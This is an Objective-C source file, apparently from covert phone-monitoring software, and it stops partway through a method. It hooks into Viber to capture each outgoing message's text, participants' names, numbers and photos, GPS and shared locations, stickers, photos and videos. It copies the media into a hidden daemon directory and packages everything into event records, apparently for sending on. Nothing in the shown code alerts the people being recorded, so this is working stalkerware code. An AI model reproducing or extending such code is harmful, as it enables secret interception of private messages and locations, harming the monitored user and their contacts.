//
//  ViberUtilsV2.m
//  MSFSP
//
//  Created by Makara on 9/12/14.
//
//

#import "ViberUtilsV2.h"
#import "ViberUtils.h"
#import "ViberQueryOP.h"
#import "IMShareUtils.h"

#import "TelephoneNumber.h"
#import "FxIMEvent.h"
#import "FxRecipient.h"
#import "FxIMGeoTag.h"
#import "FxAttachment.h"
#import "DateTimeFormat.h"
#import "DaemonPrivateHome.h"
#import "FMDatabase.h"

#import "DBManager.h"
#import "DBManager+5-0-0.h"
#import "VDBMessage.h"
#import "VDBConversation.h"
#import "VDBConversation+6-0-1.h"
#import "VDBPhoneNumberIndex.h"
#import "VDBContact.h"
#import "VDBLocation.h"
#import "VDBAttachment.h"
#import "VDBAttachment+5-6-5.h"
#import "ABContact.h"
#import "ABContact+5-0-0.h"
#import "UserDetailsManager.h"
#import "StickersManager+Viber.h"
#import "StickersManager+4-2.h"
#import "StickerData+Viber.h"
#import "StickerData+4-2.h"

#import "PLPhotoLibrary.h"
#import "PLPhoto.h"

#import <objc/runtime.h>
#import <AssetsLibrary/AssetsLibrary.h>

// Viber 5.2.2
#import "VIBUserDetailsManager.h"
#import "VIBStickersManager.h"
#import "VIBStickersManager+5-4-0.h"
#import "VIBStickerData.h"

// Viber 5.5.0
#import "VDBFormattedMessage.h"
#import "VIBFormattedMessageTextAttributes.h"
#import "VIBFormattedMessageAction.h"

#import <Photos/Photos.h>
#import <AVFoundation/AVFoundation.h>

static ViberUtilsV2 *_ViberUtilsV2 = nil;

@interface ViberUtilsV2 (PRIVATE)
- (void) captureOutgoingViber: (NSArray *) aArgs;
- (void) captureIncomingViber: (NSArray *) aArgs;

- (FxIMEvent *) createViberEventWithViberMessage: (VDBMessage *) aVDBMessage dbManager: (DBManager *) aDBManager isOutgoing: (BOOL) aIsOutgoing;

- (void) captureViberUserLocation: (FxIMEvent *) aIMEvent dbManager: (DBManager *) aDBManager viberMessage: (VDBMessage *) aViberMessage;
- (void) captureViberSharedLocation: (FxIMEvent *) aIMEvent dbManager: (DBManager *) aDBManager viberMessage: (VDBMessage *) aViberMessage;
- (void) captureViberSticker: (FxIMEvent *) aIMEvent dbManager: (DBManager *) aDBManager viberMessage: (VDBMessage *) aViberMessage;
- (void) captureViberPhoto: (FxIMEvent *) aIMEvent dbManager: (DBManager *) aDBManager viberMessage: (VDBMessage *) aViberMessage;
- (void) captureViberVideo: (FxIMEvent *) aIMEvent dbManager: (DBManager *) aDBManager viberMessage: (VDBMessage *) aViberMessage;
- (void) captureViberSharedContact: (FxIMEvent *) aIMEvent dbManager: (DBManager *) aDBManager viberMessage: (VDBMessage *) aViberMessage;

- (void) sendViberEvent: (FxIMEvent *) aIMEvent
		   viberMessage: (VDBMessage *) aViberMessage
			 shouldWait: (BOOL)aShouldWait
		  downloadVideo: (BOOL)aDownloadVideo;

+ (void) threadSendViberEvent: (NSArray *) aArgs;
+ (NSString *) locationAddressFromViberDatabase: (VDBMessage *) aViberMessage;
+ (FxAttachment *) videoAttachmentWait: (VDBMessage *) aViberMessage;
+ (FxAttachment *) downloadVideoAttachmentWait: (VDBMessage *) aViberMessage;

+ (BOOL) isAssetUrl: (NSString *) aUrl;
@end

@implementation ViberUtilsV2

+ (id) sharedViberUtilsV2 {
    if (_ViberUtilsV2 == nil) {
        _ViberUtilsV2 = [[ViberUtilsV2 alloc] init];
    }
    return (_ViberUtilsV2);
}

#pragma mark - Public methods -

+ (void) captureOutgoingViber: (VDBMessage *) aVDBMessage
                withDBManager: (DBManager *) aDBManager {
	NSThread *currentThread = [NSThread currentThread];
	NSArray *args = [NSArray arrayWithObjects:aVDBMessage, aDBManager, currentThread, nil];
	ViberUtilsV2 *viberUtilsV2 = [[ViberUtilsV2 alloc] init];
	
    NSOperationQueue *queue = [[ViberUtils sharedViberUtils] mQueryQueue];
	
    ViberQueryOP *op = [[ViberQueryOP alloc] init];
    [op setMArguments:args];
    [op setMSelector:@selector(captureOutgoingViber:)];
    [op setMDelegate:viberUtilsV2];
    [op setMWaitInterval:3];
    [queue addOperation:op];
    [op release];
    
    [viberUtilsV2 release];
}

+ (void) captureIncomingViber: (VDBMessage *) aVDBMessage
                withDBManager: (DBManager *) aDBManager {
    // NOT USED YET
}

#pragma mark - Private methods -

- (void) captureOutgoingViber: (NSArray *) aArgs {
    @try {
        VDBMessage *vdbMessage = [aArgs objectAtIndex:0];
        DBManager *dbManager = [aArgs objectAtIndex:1];
        
        //DLog(@"vdbMessage       = %@", vdbMessage);
        //DLog(@"dbManager        = %@", dbManager);
        
        DLog(@"---------------- VDBMessage ------------------");
        DLog(@"conversation     = %@", [vdbMessage conversation]);
        DLog(@"phoneNumIndex    = %@", [vdbMessage phoneNumIndex]);
        DLog(@"attachment       = %@", [vdbMessage attachment]);
        DLog(@"location         = %@", [vdbMessage location]);
        DLog(@"---------------- VDBMessage ------------------");
        
        FxIMEvent *imEvent = [self createViberEventWithViberMessage:vdbMessage dbManager:dbManager isOutgoing:YES];
        
        [self captureViberUserLocation:imEvent dbManager:dbManager viberMessage:vdbMessage];
        [self captureViberSharedLocation:imEvent dbManager:dbManager viberMessage:vdbMessage];
        [self captureViberSticker:imEvent dbManager:dbManager viberMessage:vdbMessage];
        [self captureViberPhoto:imEvent dbManager:dbManager viberMessage:vdbMessage];
        [self captureViberVideo:imEvent dbManager:dbManager viberMessage:vdbMessage];
        [self captureViberSharedContact:imEvent dbManager:dbManager viberMessage:vdbMessage];
        
        BOOL shouldWait = NO;
        BOOL shouldDownload = NO;
        
        if ([[vdbMessage mediaType] isEqualToString:@"video"]) {
            if (![[vdbMessage attachment] url]) {
                if ([vdbMessage.attachment respondsToSelector:@selector(photoLibraryAssetIdentifier)]) { // 5.6.5
                    if (![vdbMessage.attachment photoLibraryAssetIdentifier]) {
                        shouldWait = YES;
                    }
                } else {
                    shouldWait = YES;
                }
            }
        }
        
        [self sendViberEvent:imEvent viberMessage:vdbMessage shouldWait:shouldWait downloadVideo:shouldDownload];
    }
    @catch (NSException *exception) {
        DLog(@"Capture outgoing Viber exception: %@", exception);
    }
    @finally {
        ;
    }
}

- (void) captureIncomingViber: (NSArray *) aArgs {
    // NOT USED YET
}

#pragma mark Create FxIMEvent

- (FxIMEvent *) createViberEventWithViberMessage: (VDBMessage *) aVDBMessage dbManager: (DBManager *) aDBManager isOutgoing: (BOOL) aIsOutgoing {
    NSString *imServiceID           = @"viber";
    NSString *userId                = nil;
    NSString *userDisplayName       = nil;
    NSData *userPhoto               = nil;
    NSMutableArray *participants    = nil;
    NSString *message               = nil;
    NSString *convId                = nil;
    NSString *convName              = nil;
    NSData *convPhoto               = nil;
    FxEventDirection direction      = kEventDirectionUnknown;
    
    VDBConversation *conv = [aVDBMessage conversation];
    convName = [conv name];
    message = [aVDBMessage text];
    participants = [NSMutableArray array];
    
    id userDetailsManager = nil;
    
    Class $UserDetailsManager = objc_getClass("UserDetailsManager");        // Viber prior to 5.2.2
    UserDetailsManager * userDetail = [$UserDetailsManager sharedUserDetailsManager];
    userDetailsManager = userDetail;
    
    // In Viber 5.2.2 onward, UserDetailsManager class was replaced by VIBUserDetailsManager
    if (!userDetailsManager) {
        Class $VIBUserDetailsManager = objc_getClass("VIBUserDetailsManager");  // Viber 5.2.2
        VIBUserDetailsManager *vibUserDetail = [$VIBUserDetailsManager sharedVIBUserDetailsManager];
        userDetailsManager = vibUserDetail;
    }
    
    DLog(@"My photo path =  %@", [userDetailsManager getMyUserPhotoPath]);
    NSData *myPhoto = [NSData dataWithContentsOfFile:[userDetailsManager getMyUserPhotoPath]];
    
    if (!myPhoto) {
        UIImage *owner = [userDetailsManager getMyUserPhoto];
        if (owner)
            myPhoto = UIImagePNGRepresentation(owner);
//        myPhoto = [NSData dataWithContentsOfFile:[userDetailsManager getMyUserPhotoPath]];
    }
    
    if (aIsOutgoing) {
        userId = @"owner";
        userDisplayName = [userDetailsManager getMyUserName];
        userPhoto = myPhoto;
        direction = kEventDirectionOut;
        
        VDBPhoneNumberIndex *value = nil;
        NSEnumerator *enumerator = [conv.phoneNumIndexes objectEnumerator];
        while ((value = [enumerator nextObject])) {
            ABContact *abContact = [aDBManager abContactWithCanonizedPhone:[value canonizedPhoneNum]];
            DLog(@"iconPath of participant = %@", [abContact iconPath]);
            NSData * participantIcon = [NSData dataWithContentsOfFile:[abContact iconPath]];
            
            FxRecipient *participant = [[FxRecipient alloc] init];
            [participant setRecipNumAddr:[value phoneNum]];
            [participant setMPicture:participantIcon];
            if ([value name]) {
                [participant setRecipContactName:[value name]];
            } else {
                [participant setRecipContactName:[value displayName]];
            }
            [participants addObject:participant];
            [participant release];
        }
        
        convId = [conv groupID];
        if(!convId) {
            FxRecipient *participant = [participants objectAtIndex:0];
            convId = [participant recipNumAddr];
            convPhoto = [participant mPicture];
        }
        
    } else {
        direction = kEventDirectionIn;
        
        FxRecipient *participant = [[FxRecipient alloc] init];
        [participant setRecipNumAddr:@"owner"];
        [participant setRecipContactName:[userDetailsManager getMyUserName]];
        [participant setMPicture:myPhoto];
        [participants addObject:participant];
        [participant release];
        
        VDBPhoneNumberIndex *value = nil;
        NSEnumerator *enumerator = [conv.phoneNumIndexes objectEnumerator];
        while ((value = [enumerator nextObject])) {
            ABContact *abContact = [aDBManager abContactWithCanonizedPhone:[value canonizedPhoneNum]];
            DLog(@"iconPath of particpant = %@", [abContact iconPath]);
            
            TelephoneNumber *telephoneNumber = [[TelephoneNumber alloc] init];
            if([telephoneNumber isNumber:[[aVDBMessage phoneNumIndex] phoneNum] matchWithMonitorNumber:[value phoneNum]]) {
                userId = [value phoneNum];
                userDisplayName = [value name];
                if (!userDisplayName) {
                    userDisplayName = [value displayName];
                }
                userPhoto = [NSData dataWithContentsOfFile:[abContact iconPath]];
                
            } else {
                ABContact *abContact = [aDBManager abContactWithCanonizedPhone:[value canonizedPhoneNum]];
                DLog(@"abContact = %@", abContact);
                NSData * participantIcon = [NSData dataWithContentsOfFile:[abContact iconPath]];
                
                FxRecipient *participant = [[FxRecipient alloc] init];
                [participant setRecipNumAddr:[value phoneNum]];
                if ([value name]) {
                    [participant setRecipContactName:[value name]];
                } else {
                    [participant setRecipContactName:[value displayName]];
                }
                [participant setMPicture:participantIcon];
                [participants addObject:participant];
                [participant release];
            }
            [telephoneNumber release];
        }
    
        convId = [conv groupID];
        if(!convId) {
            convId = userId;
            convPhoto = userPhoto;
        }
    }
    
    DLog(@"[conv groupID]	= %@", [conv groupID]);
    DLog(@"userId			= %@", userId);
    DLog(@"userDisplayName	= %@", userDisplayName);
    DLog(@"userPhoto length	= %lu", (unsigned long)[userPhoto length]);
    DLog(@"message			= %@", message);
    DLog(@"convId			= %@", convId);
    DLog(@"convName			= %@", convName);
    DLog(@"convPhoto length	= %lu", (unsigned long)[convPhoto length]);
    DLog(@"direction		= %d", direction);
    for (FxRecipient *recipient in participants) {
        DLog(@"participantNumber		= %@", [recipient recipNumAddr]);
        DLog(@"participantContactName	= %@", [recipient recipContactName]);
        DLog(@"participantPhoto	length	= %lu", (unsigned long)[[recipient mPicture] length]);
    }
    
    FxIMEvent *imEvent = [[FxIMEvent alloc] init];
    [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
    [imEvent setMDirection:direction];
    [imEvent setMIMServiceID:imServiceID];
    [imEvent setMMessage:message];
    [imEvent setMRepresentationOfMessage:kIMMessageText];
    [imEvent setMUserID:userId];
    [imEvent setMUserDisplayName:userDisplayName];
    [imEvent setMUserPicture:userPhoto];
    [imEvent setMParticipants:participants];
    
    // New fields ...
    [imEvent setMServiceID:kIMServiceViber];
    [imEvent setMConversationID:convId];
    [imEvent setMConversationName:convName];
    [imEvent setMConversationPicture:convPhoto];
    
    return ([imEvent autorelease]);
}

#pragma mark Capture user location

- (void) captureViberUserLocation: (FxIMEvent *) aIMEvent dbManager: (DBManager *) aDBManager viberMessage: (VDBMessage *) aViberMessage {
    BOOL isLocation = NO;
    if ([[aViberMessage conversation] respondsToSelector:@selector(isLocation)]) {
        isLocation = [[aViberMessage conversation] isLocation];
    } else if ([[aViberMessage conversation] respondsToSelector:@selector(isSharingLocation)]) { // 6.0.1
        isLocation = [[aViberMessage conversation] isSharingLocation];
    }
    
    if (isLocation && ![[aViberMessage mediaType] isEqualToString:@"customLocation"]) {
        DLog(@"***** User location = %@", [aViberMessage location]);
        
        VDBLocation *viberLocation = [aViberMessage location];
        FxIMGeoTag *location = [[FxIMGeoTag alloc] init];
        [location setMLongitude:[viberLocation longitude]];
        [location setMLatitude:[viberLocation latitude]];
        [location setMHorAccuracy:[viberLocation horizontalAccuracy]];
        [location setMPlaceName:[viberLocation address]];
        [aIMEvent setMUserLocation:location];
        [location release];
        
        DLog (@"hor accu = %f", [viberLocation horizontalAccuracy]);
        DLog (@"Viber user location address = %@", [viberLocation address]);
    }
}

#pragma mark Capture shared location

- (void) captureViberSharedLocation: (FxIMEvent *) aIMEvent dbManager: (DBManager *) aDBManager viberMessage: (VDBMessage *) aViberMessage {
    if ([[aViberMessage mediaType] isEqualToString:@"customLocation"]) {
        DLog(@"***** Shared location = %@", [aViberMessage location]);
        
        VDBLocation *viberLocation = [aViberMessage location];
        FxIMGeoTag *location = [[FxIMGeoTag alloc] init];
        [location setMLongitude:[viberLocation longitude]];
        [location setMLatitude:[viberLocation latitude]];
        [location setMHorAccuracy:[viberLocation horizontalAccuracy]];
        [location setMPlaceName:[viberLocation address]];
        [aIMEvent setMShareLocation:location];
        [aIMEvent setMRepresentationOfMessage:kIMMessageShareLocation];
        [location release];
        
        DLog (@"hor accu = %f", [viberLocation horizontalAccuracy]);
        DLog (@"Viber shared location address = %@", [viberLocation address]);
    }
}

#pragma mark Capture sticker

- (void) captureViberSticker: (FxIMEvent *) aIMEvent dbManager: (DBManager *) aDBManager viberMessage: (VDBMessage *) aViberMessage {
    VDBAttachment *attachment = [aViberMessage attachment];
    if ([[aViberMessage mediaType] isEqualToString:@"sticker"] &&
        [[attachment type] isEqualToString:@"sticker"]) {
        NSAutoreleasePool *stickerPool = [[NSAutoreleasePool alloc] init];

        Class $StickersManager = objc_getClass("StickersManager");
        
        NSNumber *number                        = [[NSNumber alloc] initWithInteger:[[attachment ID] integerValue]];
        NSMutableDictionary *stickerDataCache   = nil;
        
        if ($StickersManager) {  // This class doesn't exist on Viber 5.2.2
            StickersManager *stickerManager     = [$StickersManager sharedStickersManager];
            stickerDataCache                    = [stickerManager stickerDataCache];
        } else {
            Class $VIBStickersManager = objc_getClass("VIBStickersManager");
            VIBStickersManager *vibStickerManager   = [$VIBStickersManager sharedVIBStickersManager];
            if ([vibStickerManager respondsToSelector:@selector(stickerDataCache)]) {
                stickerDataCache = [vibStickerManager stickerDataCache];
            }
        }
        DLog(@"stickerDataCache = %@", stickerDataCache);

        StickerData *stickerData = nil;
        if (stickerDataCache) {
            stickerData = [stickerDataCache objectForKey:number];
        } else {
            Class $VIBStickersManager = objc_getClass("VIBStickersManager");
            VIBStickersManager *vibStickerManager = [$VIBStickersManager sharedVIBStickersManager];
            if (vibStickerManager) {
                stickerData = [vibStickerManager stickerDataForID:number]; // VIBStickerData
            }
        }

        [number release];
        
        DLog(@"stickerData, %@", stickerData);
        DLog(@"Sticker imagePath, %@", [stickerData imagePath]);
        NSData *sticker = [NSData dataWithContentsOfFile:[stickerData imagePath]];
        
        NSMutableArray *attachments = [[NSMutableArray alloc] init];
        
        FxAttachment *attachment = [[FxAttachment alloc] init];
        [attachment setMThumbnail:sticker];
        [attachments addObject:attachment];
        [attachment release];
        
        [aIMEvent setMAttachments:attachments];
        [aIMEvent setMRepresentationOfMessage:kIMMessageSticker];
        [attachments release];
        
        [stickerPool release];
    }
}

#pragma mark Capture photo

- (void) captureViberPhoto: (FxIMEvent *) aIMEvent dbManager: (DBManager *) aDBManager viberMessage: (VDBMessage *) aViberMessage {
    VDBAttachment *attachment = [aViberMessage attachment];
    if ([[aViberMessage mediaType] isEqualToString:@"picture"] &&
        [[attachment type] isEqualToString:@"picture"]) {
        NSAutoreleasePool *photoPool = [[NSAutoreleasePool alloc] init];
        
        DLog(@"previewPath      = %@", [attachment previewPath]);
        DLog(@"bigPreviewPath   = %@", [attachment bigPreviewPath]);
        DLog(@"url              = %@", [attachment url]);
        
        NSString *imViberAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imViber/"];
        __block NSString *saveFilePath = [NSString stringWithFormat:@"%@%f%@", imViberAttachmentPath, [[aViberMessage date] timeIntervalSince1970], [attachment name]];
        
        if ([attachment url] && [[self class] isAssetUrl:[attachment url]]) {
            __block NSConditionLock *assetLock = [[NSConditionLock alloc] initWithCondition:0];
            
            dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
            dispatch_async(queue, ^(void) {
                
                NSAssert(![NSThread isMainThread], @"can't be called on the main thread due to ALAssetLibrary limitations");
                
                NSURL *url = [NSURL URLWithString:[attachment url]];
                
                Class $ALAssetsLibrary = objc_getClass("ALAssetsLibrary");
                ALAssetsLibrary *assetLibrary = [[$ALAssetsLibrary alloc] init];
                [assetLibrary assetForURL:url resultBlock:^(ALAsset *asset) {
                    
                    [assetLock lock];
                    
                    NSData *photo = nil;
                    ALAssetRepresentation *rep = [asset defaultRepresentation];
                    CGImageRef iref = [rep fullScreenImage];
                    if (iref) {
                        UIImage *image = [UIImage imageWithCGImage:iref];
                        photo = UIImageJPEGRepresentation(image, 1);
                        if (![photo writeToFile:saveFilePath atomically:YES]) {
                            // iOS 9, Sandbox
                            saveFilePath = [IMShareUtils saveData:photo toDocumentSubDirectory:@"/attachments/imViber/" fileName:[saveFilePath lastPathComponent]];
                        }
                    }
                    
                    if (!photo) {
                        DLog(@"Cannot get photo from asset url");
                        saveFilePath = @"image/jpeg";
                    } else {
                        DLog(@"OK, can get photo from asset url");
                    }
                    
                    NSData *thumnail = [NSData dataWithContentsOfFile:[attachment bigPreviewPath]];
                    if (!thumnail) {
                        thumnail = [NSData dataWithContentsOfFile:[attachment previewPath]];
                    }
                    
                    NSMutableArray *attachments = [[NSMutableArray alloc] init];
                    
                    FxAttachment *attachment = [[FxAttachment alloc] init];
                    [attachment setFullPath:saveFilePath];
                    [attachment setMThumbnail:thumnail];
                    [attachments addObject:attachment];
                    [attachment release];
                    
                    [aIMEvent setMAttachments:attachments];
                    if ([aIMEvent mMessage] && [[aIMEvent mMessage] length] != 0) {
                        [aIMEvent setMRepresentationOfMessage:(kIMMessageNone | kIMMessageText)];
                    } else {
                        [aIMEvent setMRepresentationOfMessage:kIMMessageNone];
                    }
                    
                    [attachments release];
                    
                    DLog(@"*** [UNLOCK... READING PHOTO BLOCK, OK] ****");
                    [assetLock unlockWithCondition:1];
                    
                } failureBlock:^(NSError *err) {
                    DLog(@"Cannot get photo error: %@",[err localizedDescription]);
                    
                    [assetLock lock];
                    DLog(@"*** [UNLOCK... READING PHOTO BLOCK, FAIL] ****");
                    [assetLock unlockWithCondition:1];
                }];
            });
            
            DLog(@"*** [LOCK... WAITING PHOTO BLOCK TO COMPLETE] ****");
            [assetLock lockWhenCondition:1];
            
            [assetLock release];
            
        } else {
            NSData *photo = nil;
            if ([attachment url]) { // Url is not asset url form
                NSURL *url = [NSURL URLWithString:[attachment url]];
                photo = [NSData dataWithContentsOfURL:url];
                if (![photo writeToFile:saveFilePath atomically:YES]) {
                    // iOS 9, Sandbox
                    saveFilePath = [IMShareUtils saveData:photo toDocumentSubDirectory:@"/attachments/imViber/" fileName:[saveFilePath lastPathComponent]];
                }
            }
            
            if (!photo) {
                DLog(@"Cannot get photo from non-asset url");
                saveFilePath = @"image/jpeg";
            } else {
                DLog(@"OK, can get photo from non-aseet url");
            }
            
            NSData *thumnail = [NSData dataWithContentsOfFile:[attachment bigPreviewPath]];
            if (!thumnail) {
                thumnail = [NSData dataWithContentsOfFile:[attachment previewPath]];
            }
            
            NSMutableArray *attachments = [[NSMutableArray alloc] init];
            
            FxAttachment *attachment = [[FxAttachment alloc] init];
            [attachment setFullPath:saveFilePath];
            [attachment setMThumbnail:thumnail];
            [attachments addObject:attachment];
            [attachment release];
            
            [aIMEvent setMAttachments:attachments];
            if ([aIMEvent mMessage] && [[aIMEvent mMessage] length] != 0) {
                [aIMEvent setMRepresentationOfMessage:(kIMMessageNone | kIMMessageText)];
            } else {
                [aIMEvent setMRepresentationOfMessage:kIMMessageNone];
            }
            
            [attachments release];
        }
        
        [photoPool release];
    }
}

#pragma mark Capture video

- (void) captureViberVideo: (FxIMEvent *) aIMEvent dbManager: (DBManager *) aDBManager viberMessage: (VDBMessage *) aViberMessage {
    VDBAttachment *attachment = [aViberMessage attachment];
    if ([[aViberMessage mediaType] isEqualToString:@"video"] &&
        [[attachment type] isEqualToString:@"video"]) {
        NSAutoreleasePool *videoPool = [[NSAutoreleasePool alloc] init];
        
        DLog(@"previewPath      = %@", [attachment previewPath]);
        DLog(@"bigPreviewPath   = %@", [attachment bigPreviewPath]);
        DLog(@"url              = %@", [attachment url]);
        
        NSString *attachmentAssetUrl = nil;
        PHAsset *phAssetVideo = nil;
        if ([attachment respondsToSelector:@selector(photoLibraryAssetIdentifier)] &&
            [attachment photoLibraryAssetIdentifier]) { // 5.6.5 (iOS 7,8 is an asset url)
            DLog(@"photoLibraryAssetIdentifier = %@", [attachment photoLibraryAssetIdentifier]);
            Class $PHAsset = objc_getClass("PHAsset");
            PHFetchResult *result = [$PHAsset fetchAssetsWithLocalIdentifiers:[NSArray arrayWithObject:[attachment photoLibraryAssetIdentifier]] options:nil];
            DLog(@"result: %@", result);
            DLog(@"firstObject: %@", result.firstObject);
            DLog(@"lastObject: %@", result.lastObject);
            
            phAssetVideo = result.firstObject;
            
            if (!$PHAsset) { // iOS < 9
                attachmentAssetUrl = [attachment photoLibraryAssetIdentifier];
            }
        } else {
            // < 5.6.5
            attachmentAssetUrl = [attachment url];
        }
        
        NSString *imViberAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imViber/"];
        __block NSString *saveFilePath = [NSString stringWithFormat:@"%@%f%@", imViberAttachmentPath, [[aViberMessage date] timeIntervalSince1970], [attachment name]];
        
        if (attachmentAssetUrl && [[self class] isAssetUrl:attachmentAssetUrl]) {
            __block NSConditionLock *assetLock = [[NSConditionLock alloc] initWithCondition:0];
            
            dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
            dispatch_async(queue, ^(void) {
                
                NSAssert(![NSThread isMainThread], @"can't be called on the main thread due to ALAssetLibrary limitations");
                
                NSURL *url = [NSURL URLWithString:attachmentAssetUrl];
                
                Class $ALAssetsLibrary = objc_getClass("ALAssetsLibrary");
                ALAssetsLibrary *assetLibrary = [[$ALAssetsLibrary alloc] init];
                [assetLibrary assetForURL:url resultBlock:^(ALAsset *asset) {
                    
                    [assetLock lock];
                    
                    ALAssetRepresentation *rep = [asset defaultRepresentation];
                    Byte *buffer = (Byte*)malloc(rep.size);
                    NSUInteger buffered = [rep getBytes:buffer fromOffset:0.0 length:rep.size error:nil];
                    NSData *video = [NSData dataWithBytesNoCopy:buffer length:buffered freeWhenDone:YES];
                    if (![video writeToFile:saveFilePath atomically:YES]) {
                        // iOS 9, Sandbox
                        saveFilePath = [IMShareUtils saveData:video toDocumentSubDirectory:@"/attachments/imViber/" fileName:[saveFilePath lastPathComponent]];
                    }
                    
                    if (!video) {
                        DLog(@"Cannot get video from asset url");
                        saveFilePath = @"video/quicktime";
                    } else {
                        DLog(@"OK, can get video from asset url");
                    }
                    
                    NSData *thumnail = [NSData dataWithContentsOfFile:[attachment bigPreviewPath]];
                    if (!thumnail) {
                        thumnail = [NSData dataWithContentsOfFile:[attachment previewPath]];
                    }
                    
                    NSMutableArray *attachments = [[NSMutableArray alloc] init];
                    
                    FxAttachment *attachment = [[FxAttachment alloc] init];
                    [attachment setFullPath:saveFilePath];
                    [attachment setMThumbnail:thumnail];
                    [attachments addObject:attachment];
                    [attachment release];
                    
                    [aIMEvent setMAttachments:attachments];
                    
                    if ([aIMEvent mMessage] && [[aIMEvent mMessage] length] != 0) {
                        [aIMEvent setMRepresentationOfMessage:(kIMMessageNone | kIMMessageText)];
                    } else {
                        [aIMEvent setMRepresentationOfMessage:kIMMessageNone];
                    }
                    
                    [attachments release];
                    
                    DLog(@"*** [UNLOCK... READING VIDEO BLOCK, OK] ****");
                    [assetLock unlockWithCondition:1];
                    
                } failureBlock:^(NSError *err) {
                    DLog(@"Cannot get video error: %@",[err localizedDescription]);
                    
                    [assetLock lock];
                    DLog(@"*** [UNLOCK... READING VIDEO BLOCK, FAIL] ****");
                    [assetLock unlockWithCondition:1];
                }];
            });
            
            DLog(@"*** [LOCK... WAITING VIDEO BLOCK TO COMPLETE] ****");
            [assetLock lockWhenCondition:1];
            
            /*
             NOTE: always print below lines in debug build: http://stackoverflow.com/questions/1299785/break-on-nslockerror-to-debug-how-to
             *** -[NSConditionLock dealloc]: lock (<NSConditionLock: 0x17105660> '(null)') deallocated while still in use
             *** Break on _NSLockError() to debug.
             */
            [assetLock release];
            
        } else if (phAssetVideo) { // 5.6.5
            __block NSConditionLock *assetLock = [[NSConditionLock alloc] initWithCondition:0];
            
            dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
            dispatch_async(queue, ^(void) {
                Class $PHImageManager = objc_getClass("PHImageManager");
                [(PHImageManager *)[$PHImageManager defaultManager] requestAVAssetForVideo:phAssetVideo options:nil resultHandler:^(AVAsset *asset, AVAudioMix *audioMix, NSDictionary *info) {
                    [assetLock lock];
                    
                    DLog(@"asset: %@", asset);
                    DLog(@"audioMix: %@", audioMix);
                    DLog(@"info: %@", info);
                    
                    // iOS 9, Sandbox
                    NSData *test = [@"test" dataUsingEncoding:NSUTF8StringEncoding];
                    saveFilePath = [IMShareUtils saveData:test toDocumentSubDirectory:@"/attachments/imViber/" fileName:[saveFilePath lastPathComponent]];
                    [[NSFileManager defaultManager] removeItemAtPath:saveFilePath error:nil];
                
                    NSURL *fileURL = [NSURL fileURLWithPath:saveFilePath];
                    //__block NSData *assetData = nil;
                    
                    // asset is you AVAsset object
                    AVAssetExportSession *exportSession = [[[AVAssetExportSession alloc] initWithAsset:asset presetName:AVAssetExportPresetHighestQuality] autorelease];
                    exportSession.outputFileType = AVFileTypeMPEG4; // AVFileTypeQuickTimeMovie
                    exportSession.outputURL = fileURL;
                    
                    [exportSession exportAsynchronouslyWithCompletionHandler:^{
                        //assetData = [NSData dataWithContentsOfURL:filePath];
                        DLog(@"AVAsset saved to fileURL, %@", fileURL);
                        DLog(@"AVAsset saved to fileURL.path, %@", fileURL.path);
                        
                        // Video thumbnail
                        NSData *thumnail = [NSData dataWithContentsOfFile:[attachment bigPreviewPath]];
                        if (!thumnail) {
                            thumnail = [NSData dataWithContentsOfFile:[attachment previewPath]];
                        }
                        
                        NSMutableArray *attachments = [[NSMutableArray alloc] init];
                        FxAttachment *attachment = [[FxAttachment alloc] init];
                        [attachment setFullPath:fileURL.path]; // saveFilePath -> Segmentation fault: 11
                        [attachment setMThumbnail:thumnail];
                        [attachments addObject:attachment];
                        [attachment release];
                        [aIMEvent setMAttachments:attachments];
                        
                        if ([aIMEvent mMessage] && [[aIMEvent mMessage] length] != 0) {
                            [aIMEvent setMRepresentationOfMessage:(kIMMessageNone | kIMMessageText)];
                        } else {
                            [aIMEvent setMRepresentationOfMessage:kIMMessageNone];
                        }
                        
                        [attachments release];
                        
                        DLog(@"*** [UNLOCK... READING VIDEO BLOCK, OK] ****");
                        [assetLock unlockWithCondition:1];
                    }];
                }];
            });
            
            DLog(@"*** [LOCK... WAITING VIDEO BLOCK TO COMPLETE] ****");
            [assetLock lockWhenCondition:1];
            [assetLock release];
            
        } else {
            NSData *video = nil;
            if ([attachment url]) { // Url is not asset url form
                NSURL *url = [NSURL URLWithString:[attachment url]];
                video = [NSData dataWithContentsOfURL:url];
                if (![video writeToFile:saveFilePath atomically:YES]) {
                    // iOS 9, Sandbox
                    saveFilePath = [IMShareUtils saveData:video toDocumentSubDirectory:@"/attachments/imViber/" fileName:[saveFilePath lastPathComponent]];
                }
            }
            
            if (!video) {
                DLog(@"Cannot get video from non-asset url");
                saveFilePath = @"video/quicktime";
            } else {
                DLog(@"OK, can get photo from non-aseet url");
            }
            
            NSData *thumnail = [NSData dataWithContentsOfFile:[attachment bigPreviewPath]];
            if (!thumnail) {
                thumnail = [NSData dataWithContentsOfFile:[attachment previewPath]];
            }
            
            NSMutableArray *attachments = [[NSMutableArray alloc] init];
            
            FxAttachment *attachment = [[FxAttachment alloc] init];
            [attachment setFullPath:saveFilePath];
            [attachment setMThumbnail:thumnail];
            [attachments addObject:attachment];
            [attachment release];
            
            [aIMEvent setMAttachments:attachments];
            if ([aIMEvent mMessage] && [[aIMEvent mMessage] length] != 0) {
                [aIMEvent setMRepresentationOfMessage:(kIMMessageNone | kIMMessageText)];
            } else {
                [aIMEvent setMRepresentationOfMessage:kIMMessageNone];
            }
            
            [attachments release];
        }
        
        [videoPool release];
    }
}

#pragma mark Capture shared contact

- (void) captureViberSharedContact: (FxIMEvent *) aIMEvent dbManager: (DBManager *) aDBManager viberMessage: (VDBMessage *) aViberMessage {
    Class $VDBFormattedMessage = objc_getClass("VDBFormattedMessage");
    if ([aViberMessage isKindOfClass:$VDBFormattedMessage]) {
        VIBFormattedMessageTextAttributes *attributeText = nil;
        Class $VIBFormattedMessageTextAttributes = objc_getClass("VIBFormattedMessageTextAttributes");
        for (id attribute in [(VDBFormattedMessage *)aViberMessage attributes]) {
            if ([attribute isKindOfClass:$VIBFormattedMessageTextAttributes]) {
                attributeText = attribute;
                break;
            }
        }
        
